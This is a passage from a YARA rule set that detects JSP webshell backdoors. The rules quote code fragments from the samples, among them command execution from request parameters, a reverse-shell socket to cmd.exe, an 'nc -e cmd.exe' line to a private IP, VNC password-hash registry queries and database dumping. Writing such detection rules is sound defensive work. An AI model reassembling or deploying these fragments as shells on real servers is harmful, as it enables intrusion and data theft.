        $s16 = "<TD align=\"left\"><FONT face=\"webdings\" color=\"#ffffff\">&nbsp;8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-ser" fullword ascii
        $s17 = "sRet += \" <form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath" ascii
        $s18 = "sRet += \" if (newName != null && newName != false && ltrim(newName) != \\\"\\\") {\\n\";" fullword ascii
        $s19 = "sRet += \" <form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath" ascii
        $s20 = "<TD align=\"right\"><FONT color=\"#d2d8ec\"><b>JFolder</b>_By_<b>hack520</b></FONT></TD>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule e98aa4fe2ab52392ae8051897b93566e3ecb9d79
{
    meta:
        description = "jsp - file e98aa4fe2ab52392ae8051897b93566e3ecb9d79.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bf3ef85a52279d08e94f52d4136dd4817dac76bd11ce8df931311d5aecac946f"
    strings:
        $s1 = "Connection conn = DriverManager.getConnection(url, username, password);" fullword ascii
        $s2 = "<p>password:<input type=\"text\" name=\"password\" value=\"<%=request.getParameter(\"password\")%>\"/></p>" fullword ascii
        $s3 = "rs = stmt.executeQuery(\"SELECT * FROM \" + table);" fullword ascii
        $s4 = "out.println(\"Dumping data for table \" + table + \"...<br />\");" fullword ascii
        $s5 = "<p>username:<input type=\"text\" name=\"username\" value=\"<%=request.getParameter(\"username\")%>\"/></p>" fullword ascii
        $s6 = "<p>driver:<input type=\"text\" name=\"driver\" value=\"<%=request.getParameter(\"driver\")%>\"/></p>" fullword ascii
        $s7 = "String password = request.getParameter(\"password\");" fullword ascii
        $s8 = "<p>url:<input type=\"text\" name=\"url\" value=\"<%=request.getParameter(\"url\")%>\"/></p>" fullword ascii
        $s9 = "<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>" fullword ascii
        $s10 = "<input type=\"text\" name=\"bak_path\" <%=request.getParameter(\"bak_path\")%>/></p>" fullword ascii
        $s11 = "String username = request.getParameter(\"username\");" fullword ascii
        $s12 = "String driver =request.getParameter(\"driver\");" fullword ascii
        $s13 = "for (int col = 1; col <= rsmd.getColumnCount(); col++) {" fullword ascii
        $s14 = "OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(backupDir+table+ex), \"UTF-8\");" fullword ascii
        $s15 = "<form action=\"\" method=\"post\" name=\"form1\" id=\"form1\">" fullword ascii
        $s16 = "String table=request.getParameter(\"table_name\");" fullword ascii
        $s17 = "String backupDir = request.getParameter(\"bak_path\");" fullword ascii
        $s18 = "<%@ page import=\"java.sql.*\" %>" fullword ascii
        $s19 = "bw.append(\"INSERT INTO \" + table + \" VALUES(\");" fullword ascii
        $s20 = "String ex=\".txt\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 8 of them ) ) or ( all of them )
}

rule sig_246c5e7641edc64246f012f7ec36b1568683528f
{
    meta:
        description = "jsp - file 246c5e7641edc64246f012f7ec36b1568683528f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6267708efa49628619e1a430262d150428a9846783b32f85448b611b51a469c2"
    strings:
        $x1 = "Process proc = rt.exec(\"cmd.exe\");" fullword ascii
        $s2 = "<h1>JSP Backdoor Reverse Shell</h1>" fullword ascii
        $s3 = "String ipAddress = request.getParameter(\"ipaddress\");" fullword ascii
        $s4 = "<!--    http://michaeldaw.org   2006    -->" fullword ascii
        $s5 = "page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"" fullword ascii
        $s6 = "String ipPort = request.getParameter(\"port\");" fullword ascii
        $s7 = "Runtime rt = Runtime.getRuntime();" fullword ascii
        $s8 = "proc.getOutputStream());" fullword ascii
        $s9 = "sock.getOutputStream());" fullword ascii
        $s10 = "while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)" fullword ascii
        $s11 = "new StreamConnector(proc.getInputStream()," fullword ascii
        $s12 = "new StreamConnector(sock.getInputStream()," fullword ascii
        $s13 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword ascii
        $s14 = "isr = new BufferedReader(new InputStreamReader(is));" fullword ascii
        $s15 = "<input type=\"text\" name=\"ipaddress\" size=30>" fullword ascii
        $s16 = "osw.write(buffer, 0, lenRead);" fullword ascii
        $s17 = "<input type=\"text\" name=\"port\" size=10>" fullword ascii
        $s18 = "if(ipAddress != null && ipPort != null)" fullword ascii
        $s19 = "<input type=\"submit\" name=\"Connect\" value=\"Connect\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule bee670efc19f12a63d9946c8550526fddcb5b0f6
{
    meta:
        description = "jsp - file bee670efc19f12a63d9946c8550526fddcb5b0f6.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8c7137030d9653611f63d82c0dbc8354ae13a1e601bc86e94ca83fd64c28f274"
    strings:
        $x1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private String password=\"734303\";//??" fullword ascii
        $s2 = "writer.println(content);     writer.close();     if (newfile.exists() && newfile.length()>0)     {       out.println(\"<font s" fullword ascii
        $s3 = "ut.println(\"<div align='center'><form action='?act=login' method='post'>\");out.println(\"<input type='password' name='pass'/>" ascii
        $s4 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#ffffff\"><%String act=\"\";String path=request.getP" ascii
        $s5 = "login\")){    String pass=request.getParameter(\"pass\");    if(pass.equals(password))    {     session.setAttribute(\"hehe\",\"" ascii
        $s6 = "eter(\"path\");String content=request.getParameter(\"content\");String url=request.getRequestURI();String url2=request.getRealPa" ascii
        $s7 = "e(\"hehe\")!=null){if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\")){if (path!=null && !path.equals(\"" ascii
        $s8 = "equest.getServletPath());try{act=request.getParameter(\"act\").toString();}catch(Exception e){}if(request.getSession().getAttrib" ascii
        $s9 = "ut.println(\"<input type='submit' name='update' class='unnamed1' value='Login' />\");out.println(\"</form></div>\");}if(act.equa" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule bc1e03a04fc41a10945e263d865f30ad91f6736c
{
    meta:
        description = "jsp - file bc1e03a04fc41a10945e263d865f30ad91f6736c.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8a32fa3ed14e8fa7e4139e258c7a65ff4fbc3ddb8bc0e0129059c8bdd542e228"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(strCommand, null," fullword ascii
        $x2 = "<a href=\"http://www.kukafei520.net/blog\" target=\"_blank\">http://www.kukkafei520.net/blog</a>" fullword ascii
        $s3 = "+ \"<form name=login method=post>username:<input name=LName type=text size=15><br>\"" fullword ascii
        $s4 = "+ \"password:<input name=LPass type=password size=15><br><input type=submit value=Login></form></center>\");" fullword ascii
        $s5 = "Hashtable ht = parser.processData(request.getInputStream()," fullword ascii
        $s6 = "pw.println(\"print \\\"voilet shell\\nblog:www.kukafei520.net.\\\\n\\\";\");" fullword ascii
        $s7 = "+ \"<form name=login method=post>" fullword ascii
        $s8 = "<div id=\"menu4\" class=\"tabcontent\"><!-- linux nc shell -->" fullword ascii
        $s9 = "<a href=\"#\" onClick=\"return expandcontent('menu2', this)\"> <%=strCommand[languageNo]%>" fullword ascii
        $s10 = "public Hashtable processData(ServletInputStream is, String boundary," fullword ascii
        $s11 = "\" + props.getProperty(\"java.io.tmpdir\")" fullword ascii
        $s12 = "\" + props.getProperty(\"user.dir\") + \"<br>\");" fullword ascii
        $s13 = "&& request.getParameter(\"LPass\").equals(password)) {" fullword ascii
        $s14 = "//System.out.println(strCommand);" fullword ascii
        $s15 = "+ props.getProperty(\"os.version\") + \"</h3>\");" fullword ascii
        $s16 = "\" + props.getProperty(\"user.home\") + \"<br>\");" fullword ascii
        $s17 = "\" + props.getProperty(\"user.name\") + \"<br>\");" fullword ascii
        $s18 = "private final String lineSeparator = System.getProperty(" fullword ascii
        $s19 = "value=\"<%=strExecute[languageNo]%>\">" fullword ascii
        $s20 = "+ list[i].getName() + \"','\" + strCmd + \"','\"" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b6eaf949b5037ce7ed2b16ed0752bc506b0664a2
{
    meta:
        description = "jsp - file b6eaf949b5037ce7ed2b16ed0752bc506b0664a2.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c8c694306c27bfbe133f1694168f05026de575a94e2f63ba1fe65b46502c59e4"
    strings:
        $s1 = "UploadFile.uploadFile(request.getInputStream(), PAGE_ENCODING,Integer.parseInt(request.getHeader(\"Content-Length\")),path);" fullword ascii
        $s2 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+toPath+\"'});</script>\");" fullword ascii
        $s3 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+path+\"'});</script>\");" fullword ascii
        $s4 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+ppath+\"'});</script>\");" fullword ascii
        $s5 = "private static final String checkNewVersion = \"http://www.shack2.org/soft/javamanage/Getnewversion.jsp\";//" fullword ascii
        $s6 = "<form action=\"<%=shellPath %>?m=Login&do=DoLogin\" method=\"post\"" fullword ascii
        $s7 = "webRootPath = Util.formatPath(this.getClass().getClassLoader().getResource(\"/\").getPath());" fullword ascii
        $s8 = "p = Runtime.getRuntime().exec(cmds);" fullword ascii
        $s9 = "response.sendRedirect(shellPath+\"?m=Login&info=false\");" fullword ascii
        $s10 = "post('<%=shellPath%>',{'m':'FileManage','do':'newFile','path':currentDir,'isDir':isDir,'fileName':name});" fullword ascii
        $s11 = "href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','do':'editFile','path':'<%=currentPath%>'})\">" fullword ascii
        $s12 = "href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','do':'downFile','path':'<%=currentPath%>'})\">" fullword ascii
        $s13 = "href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=Util.formatPath(cf.getPath())%>'})\">" fullword ascii
        $s14 = "Object obj=dbo.execute(runmysql);" fullword ascii
        $s15 = "String isLogin=session.getAttribute(\"isLogin\")+\"\";" fullword ascii
        $s16 = "final String shellPath=request.getContextPath()+request.getServletPath();" fullword ascii
        $s17 = "192.168.11.11 |Java WebManage coded by shack2" fullword ascii
        $s18 = "Object o = dbo.execute(runmysql);" fullword ascii
        $s19 = "response.setHeader(\"Content-Disposition\", \"attachment; filename=\"+fname);" fullword ascii
        $s20 = "href=\"javascript:post('<%=shellPath%>',{m:'FileManage',do:'delete',path:'<%=currentPath%>'})\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule ecc2ea54f0a1554637c75d5173de44c9644d764f
{
    meta:
        description = "jsp - file ecc2ea54f0a1554637c75d5173de44c9644d764f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "322807a2af30c73616c67862e736796f59efe1508ee0fe6ddb1e04f10ef72c06"
    strings:
        $s1 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
        $s2 = "System.out.println(request.getMethod());" fullword ascii
        $s3 = "ResultSet r = m.executeQuery(q);" fullword ascii
        $s4 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
        $s5 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
        $s6 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
        $s7 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
        $s8 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
        $s9 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
        $s10 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
        $s11 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
        $s12 = "System.out.println(parameterName + \":\" + parameterValue);            " fullword ascii
        $s13 = "//System.out.println(name + \"=\" + value + \"<br>\");" fullword ascii
        $s14 = "sb.append(EC(r.getString(i), cs) + \"\\t|\\t\");" fullword ascii
        $s15 = "String cs = null==request.getParameter(\"z0\")?\"utf-8\":request.getParameter(\"z0\");" fullword ascii
        $s16 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
        $s17 = "System.out.println(\"--------------------\");" fullword ascii
        $s18 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword ascii
        $s19 = "ResultSet r = c.getMetaData().getCatalogs();" fullword ascii
        $s20 = "parameterValue = request.getParameter(parameterName);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule fb29687c2e81f09596a7d29efdb47dc52d7a43b0
{
    meta:
        description = "jsp - file fb29687c2e81f09596a7d29efdb47dc52d7a43b0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "79b76053dd37a289a36b93841e24801c563dca62465f7445e797341898208b10"
    strings:
        $x1 = "* Copyright 2010, AUTHORS.txt (http://jqueryui.com/about)" fullword ascii
        $x2 = "\"\",d]);this._datepickerShowing=false;this._lastInput=null;if(this._inDialog){this._dialogInput.css({position:\"absolute\",left" ascii
        $x3 = ";b.datepicker._updateDatepicker(a)}}catch(d){b.datepicker.log(d)}return true},_showDatepicker:function(a){a=a.target||" fullword ascii
        $s4 = "false;C.onload=C.onreadystatechange=function(){if(!B&&(!this.readyState||this.readyState===\"loaded\"||this.readyState===\"compl" ascii
        $s5 = "(this._dialogInput,false);a.settings={};b.data(this._dialogInput[0],\"datepicker\",a)}g(a.settings,i||{});d=d&&d.constructor==" fullword ascii
        $s6 = "lass,d.dpDiv));h[0]?b.datepicker._selectDay(a.target,d.selectedMonth,d.selectedYear,h[0]):b.datepicker._hideDatepicker();" fullword ascii
        $s7 = "<% /* pwnshell.jsp - arshan.dabirsiaghi@gmail.com */ %>" fullword ascii
        $s8 = "){xa=true;if(s.readyState===\"complete\")return c.ready();if(s.addEventListener){s.addEventListener(\"DOMContentLoaded\"," fullword ascii
        $s9 = "e(a.target);h=a.ctrlKey||a.metaKey;break;case 36:if(a.ctrlKey||a.metaKey)b.datepicker._gotoToday(a.target);h=a.ctrlKey||" fullword ascii
        $s10 = "rentMonth,a.currentDay));return this.formatDate(this._get(a,\"dateFormat\"),d,this._getFormatConfig(a))}});b.fn.datepicker=" fullword ascii
        $s11 = "ce&&V.test(i)&&r.insertBefore(b.createTextNode(V.exec(i)[0]),r.firstChild);i=r.childNodes}if(i.nodeType)e.push(i);else e=" fullword ascii
        $s12 = "ion(a){var b,d,f,e;a=arguments[0]=c.event.fix(a||A.event);a.currentTarget=this;b=a.type.indexOf(\".\")<0&&!a.exclusive;" fullword ascii
        $s13 = "t\",\"width\"];j=j?[i.width(),i.height()]:[i.height(),i.width()];var q=/([0-9]+)%/.exec(a);if(q)a=parseInt(q[1],10)/100*" fullword ascii
        $s14 = "tring\")e.data=c.param(e.data,e.traditional);if(e.dataType===\"jsonp\"){if(n===\"GET\")N.test(e.url)||(e.url+=(ka.test(e.url)?" fullword ascii
        $s15 = "(f.exec(g[3])||\"\").length>1||/^\\w/.test(g[3]))g[3]=k(g[3],null,null,h);else{g=k.filter(g[3],h,l,true^q);l||m.push.apply(m," fullword ascii
        $s16 = "==\"string\"&&!jb.test(i))i=b.createTextNode(i);else if(typeof i===\"string\"){i=i.replace(Ka,Ma);var o=(La.exec(i)||[\"\"," fullword ascii
        $s17 = "!b){this.context=s;this[0]=s.body;this.selector=\"body\";this.length=1;return this}if(typeof a===\"string\")if((d=Ta.exec(a))&&" fullword ascii
        $s18 = "false&&n===\"GET\"){var r=J(),u=e.url.replace(wb,\"$1_=\"+r+\"$2\");e.url=u+(u===e.url?(ka.test(e.url)?\"&\":\"?\")+\"_=\"+r:\"" ascii
        $s19 = "o&&b!==i;){if(c.offset.supportsFixedPosition&&f.position===\"fixed\")break;j=e?e.getComputedStyle(b,null):b.currentStyle;" fullword ascii
        $s20 = "global:true,type:\"GET\",contentType:\"application/x-www-form-urlencoded\",processData:true,async:true,xhr:A.XMLHttpRequest&&(A." ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 800KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule a2951b681435c42a5d89bdc7606042f821b134ef
{
    meta:
        description = "jsp - file a2951b681435c42a5d89bdc7606042f821b134ef.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ab9fd7ec29a69d4caa54c063c86d02f334ae1add49b0acd42a4afdfd05cb7ae0"
    strings:
        $x1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $x2 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
        $x3 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
        $x4 = "+ \"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=\\\"asyn\\\">\"" fullword ascii
        $x5 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"" fullword ascii
        $s6 = "((Invoker) ins.get(\"vLogin\")).invoke(request, response," fullword ascii
        $s7 = "ins.put(\"executesql\", new ExecuteSQLInvoker());" fullword ascii
        $s8 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
        $s9 = "+ (JSession.getAttribute(CURRENT_DIR).toString() + \"/exportdata.txt\")" fullword ascii
        $s10 = "+ \"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'executesql',type:'struct',table:'\"" fullword ascii
        $s11 = "<option value='reg query \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\RealVNC\\\\WinVNC4\\\" /v \\\"password\\\"'>vnc hash</option>\"" fullword ascii
        $s12 = "+ \"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" fullword ascii
        $s13 = "Object obj = ((DBOperator) dbo).execute(sql);" fullword ascii
        $s14 = "ins.put(\"vLogin\", new VLoginInvoker());" fullword ascii
        $s15 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"" fullword ascii
        $s16 = "var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');\"" fullword ascii
        $s17 = "+ \" <option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'>Oracle</option>\"" fullword ascii
        $s18 = "+ \"<h2>Execute Shell &raquo;</h2>\"" fullword ascii
        $s19 = "ins.put(\"login\", new LoginInvoker());" fullword ascii
        $s20 = "(new StreamConnector(process.getErrorStream(), socket" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule d71c095470234ec31a870acd0a4d3c329692fc89
{
    meta:
        description = "jsp - file d71c095470234ec31a870acd0a4d3c329692fc89.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "68382b7569ad669bf98a8ee26ecb95c098b5a7692994fef5c9d22b77ed68b069"
    strings:
        $s1 = "\" name=\"url\"><br><textarea rows=\"20\" cols=\"80\" name=\"smart\">" fullword ascii
        $s2 = "utStream\"/><jsp:directive.page import=\"java.io.FileOutputStream\"/><% int i=0;String method=request.getParameter(\"act\");if(m" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule bdaeb74a61e4ba6a92593ad8a115b8d055b80f4e
{
    meta:
        description = "jsp - file bdaeb74a61e4ba6a92593ad8a115b8d055b80f4e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
        $x2 = "request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
        $x3 = "* Command of the shell interpreter and the parameter to run a programm" fullword ascii
        $s4 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s5 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / size%>%" fullword ascii
        $s6 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
        $s7 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
        $s8 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
        $s9 = "* Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
        $s10 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
        $s11 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
        $s12 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
        $s13 = "request.setAttribute(\"error\", \"You are not allowed to access \" + request.getAttribute(\"dir\"));" fullword ascii
        $s14 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
        $s15 = "request.setAttribute(\"error\", \"Directory \" + f.getAbsolutePath() + \" does not exist.\");" fullword ascii
        $s16 = "\"Content-Disposition\", \"inline;filename=\\\"temp.txt\\\"\");" fullword ascii
        $s17 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ef.getAbsolutePath());" fullword ascii
        $s18 = "request.setAttribute(\"error\", \"You are not allowed to access \" + new_f.getAbsolutePath());" fullword ascii
        $s19 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f.getAbsoluteFile());" fullword ascii
        $s20 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f_new.getAbsolutePath());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_0317bd1d741350d9bc4adbf92801b6a109a57458
{
    meta:
        description = "jsp - file 0317bd1d741350d9bc4adbf92801b6a109a57458.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
    strings:
        $s1 = "\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
        $s2 = "private static final String PW = \"xuying\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_s11
{
    meta:
        description = "jsp - file s11.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "67337a4450f167f44893c94568dc7573b980178d7206a4898fd662a864a9c698"
    strings:
        $x1 = "Process p=Runtime.getRuntime().exec(strcmd);" fullword ascii
        $s2 = "String strcmd = request.getParameter(\"cmd\");" fullword ascii
        $s3 = "out.print(\"Hello</br>\");" fullword ascii
        $s4 = "InputStream is = p.getInputStream();" fullword ascii
        $s5 = "while((line =br.readLine())!=null){" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_4c2464503237beba54f66f4a099e7e75028707aa
{
    meta:
        description = "jsp - file 4c2464503237beba54f66f4a099e7e75028707aa.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b90b999b3d22fc2031ea2af13e3379be2c7d82bbed3544e8ab1c90da4a271750"
    strings:
        $x1 = "Hashtable ht = parser.processData(request.getInputStream(), \"-\", tempdir);" fullword ascii
        $s2 = "response.setHeader (\"Content-Disposition\", \"attachment;filename=\\\"bagheera.zip\\\"\");" fullword ascii
        $s3 = "response.setHeader (\"Content-Disposition\", \"attachment;filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
        $s4 = "<center><small>JSP ????? v1.001 By Bagheera<a href=\"http://jmmm.com\">http://jmmm.com</a>" fullword ascii
        $s5 = ".login { font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 8pt; color: #666666; width:320px; }" fullword ascii
        $s6 = "public Hashtable processData(ServletInputStream is, String boundary, String saveInDir)" fullword ascii
        $s7 = "else if (ext.equals(\".htm\")||ext.equals(\".html\")||ext.equals(\".shtml\")) response.setContentType(\"text/html\");" fullword ascii
        $s8 = "line = getLine(is); // ??\"Content-Type:\"?" fullword ascii
        $s9 = "else if (ext.equals(\".mid\")||ext.equals(\".midi\")) response.setContentType(\"audio/x-midi\");" fullword ascii
        $s10 = "else if (ext.equals(\".mov\")||ext.equals(\".qt\")) response.setContentType(\"video/quicktime\");" fullword ascii
        $s11 = "*E-mail:bagheera@beareyes.com                                                        *" fullword ascii
        $s12 = "if ((request.getContentType()!=null)&&(request.getContentType().toLowerCase().startsWith(\"multipart\"))){" fullword ascii
        $s13 = "else if (ext.equals(\".tiff\")||ext.equals(\".tif\")) response.setContentType(\"image/tiff\");" fullword ascii
        $s14 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Delete Files\"))){" fullword ascii
        $s15 = "case 1:return f1.getAbsolutePath().toUpperCase().compareTo(f2.getAbsolutePath().toUpperCase());" fullword ascii
        $s16 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Save as zip\"))){" fullword ascii
        $s17 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Create Dir\"))){" fullword ascii
        $s18 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Move Files\"))){" fullword ascii
        $s19 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Copy Files\"))){" fullword ascii
        $s20 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Create File\"))){" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_build
{
    meta:
        description = "jsp - file build.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b3350adcdf9b0ea7f90330a2c8def71bd31e91c07dd73620dfd1d855f296093b"
    strings:
        $s1 = "Process p = r.exec(command);" fullword ascii
        $s2 = "String command = String.format(\"/deploy/bin/deploy.sh %s\", param);" fullword ascii
        $s3 = "BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()), 1024);" fullword ascii
        $s4 = "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">" fullword ascii
        $s5 = "out.print(command + \"<br/>\");" fullword ascii
        $s6 = "<%@ page contentType=\"text/html; charset=UTF-8\" language=\"java\" pageEncoding=\"UTF-8\"" fullword ascii
        $s7 = "out.print(br.readLine() + \"<br/>\");" fullword ascii
        $s8 = "Runtime r = java.lang.Runtime.getRuntime();" fullword ascii
        $s9 = "buffer=\"32kb\" import=\"java.lang.Runtime,java.io.*\"%>" fullword ascii
        $s10 = "<%@page import=\"com.hhly.base.util.StringUtil\"%>" fullword ascii
        $s11 = "<%@page import=\"org.springframework.context.annotation.Import\"%>" fullword ascii
        $s12 = "out.print(e.getMessage());" fullword ascii
        $s13 = "String param = request.getParameter(\"param\");" fullword ascii
        $s14 = "<a href=\"log.jsp\">" fullword ascii
        $s15 = "while (br.read() != -1) {" fullword ascii
        $s16 = "<a href=\"build.jsp?param=api_8090\">" fullword ascii
        $s17 = "<a href=\"build.jsp?param=api_8092\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( 8 of them ) ) or ( all of them )
}

rule e5124513286150f6530d083d6f8d87e978cd7cf1
{
    meta:
        description = "jsp - file e5124513286150f6530d083d6f8d87e978cd7cf1.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "36961e06cd0a7c89ad9d34d87dad069d1b99e8de6a734bd226eea0de28eea8f2"
    strings:
        $x1 = "Process p = rt.exec(\"\\\"\" + path + \"\\\" x -o+ -p- \" + file.getAbsolutePath() + \" \" + dir.getAbsolutePath());" fullword ascii
        $x2 = "Process p = Runtime.getRuntime().exec(cmd);" fullword ascii
        $x3 = "response.setHeader(\"Content-Disposition\", \"attachment; filename=\" + URLEncoder.encode(\"file.zip\",\"UTF-8\"));" fullword ascii
